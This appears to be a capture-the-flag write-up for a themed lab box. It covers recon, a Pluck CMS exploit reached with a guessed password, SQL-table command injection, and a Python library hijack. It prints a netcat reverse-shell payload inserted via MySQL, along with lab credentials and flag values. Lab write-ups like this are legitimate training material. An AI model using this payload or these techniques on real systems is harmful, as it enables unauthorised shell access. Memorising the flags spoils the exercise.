
----------

## Description

While the king of dreams was imprisoned, his home fell into ruins.  

Can you help Sandman restore his kingdom?

-------

Visiting the website(assuming theres one), We get this.

A **simple apache2 server**.
![[Pasted image 20251130171508.png]]

Nothing special on the source code aswell.

Since I didnt find anything usefull, I **decided to do a nmap and gobuster scan**.

------

## Nmap

![[Pasted image 20251130172837.png]]

On the nmap we found two services.
1. ssh (not vulnerable)
2. http (just the apache2 server)

Lets move to gobuster.

---

## Gobuster 

On the gobuster scan I found a interesting dir -> `app`
![[Pasted image 20251130171829.png]]

Visiting the endpoint, we **found a pluck application**.

![[Pasted image 20251130172025.png]]

Inside the app we found this.
![[Pasted image 20251130172138.png]]

Fortunately I found a **exploit for this CMS app**. 
Lets use it.
![[Pasted image 20251130172621.png]]

--------

## Exploit

We have a problem, the exploit only works we are authenticated somehow.

I tried to find any default password for pluck but with no success.

I tried some easy password like, admin, pluck, but when I tried password it worked.
![[Pasted image 20251130175544.png]]

Now that we are logged in we can use the exploit.
![[Pasted image 20251130175549.png]]

Ok, nice we have a webshell (fancy).
![[Pasted image 20251130175617.png]]

-----------

## Priv escalation

Looking around the shell, I found some users.
![[Pasted image 20251130175710.png]]

I looked into all of the users, but the only one that had something useful was `morpheus`.

Morpheus have a restore.py that makes a backup to `/home/morpheus/kingdom`.
![[Pasted image 20251130181518.png]]

First I decided to upgrad my shell, because I wasnt getting all output on the webshell.
![[Pasted image 20251130182444.png]]![[Pasted image 20251130182449.png]]

After that I decided to run linpeas.sh to try to find anything useful.

I might be blind but I didnt find anything useful.

After a while I found these two files in /opt.
![[Pasted image 20251130185435.png]]

Using cat on test.py and we get the creds for lucien.
![[Pasted image 20251130185525.png]]
Ok now we are lucien, nice.

> lucien:HeyLucien#@1999!

==LUCIEN FLAG==
```lucien flag
THM{TH3_L1BR4R14N}
```

Running sudo -l , show us that we can run getDreams.py without pass.
![[Pasted image 20251130185855.png]]

I then remembered the getDreams.py was also in /opt, lets find whats inside.
![[Pasted image 20251130190031.png]]

Basically the script connects to the MySQL database, reads all rows from the `dreams` table, and retrieves each dreamer and their dream.  
Then it prints them by running an `echo` shell command for every row.

If we manage to put our malicious dream inside the table when running sudo as death the getDreams.py , we will get death shell.

For this I had to look for lucien's db password. I found it in .bash_history.
![[Pasted image 20251130191308.png]]

> lucien:lucien42DBPASSWORD

![[Pasted image 20251130191643.png]]
After putting the payload `| ls` I managed to get code to run. Lets now spawn a shell.

I used this payload:
```payload
mysql> INSERT INTO dreams (dreamer, dream) VALUES ('ez', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.133.89.2.12 4242 >/tmp/f)');
```

![[Pasted image 20251130193529.png]]
Lets get the flag.

![[Pasted image 20251130193712.png]]

==DEATH FLAG==
```death flag
THM{1M_TH3R3_4_TH3M}
```

Using cat on the real getDreams.py we get death's creds.
![[Pasted image 20251130193932.png]]

> death:!mementoMORI666!

Using sudo -l shows us that we dont have any sudo permission /:
![[Pasted image 20251130194037.png]]

We see that the script uses shutil. I tried to see if we could write into it.
![[Pasted image 20251130194511.png]]

![[Pasted image 20251130194636.png]]I dont know why, but apparently we can write into shutil.py.

First I decided to run pspy64 to see if the user morpheus was running the script (otherwise we cant get his shell)

Apparently morpheus is running this script. That way we can put our malicious code and get shell.
![[Pasted image 20251130194801.png]]
![[Pasted image 20251130195018.png]]
![[Pasted image 20251130195011.png]]

After a while I got the shell.

==MORPHEUS FLAG==
```morpheus flag
THM{DR34MS_5H4P3_TH3_W0RLD}
```

----
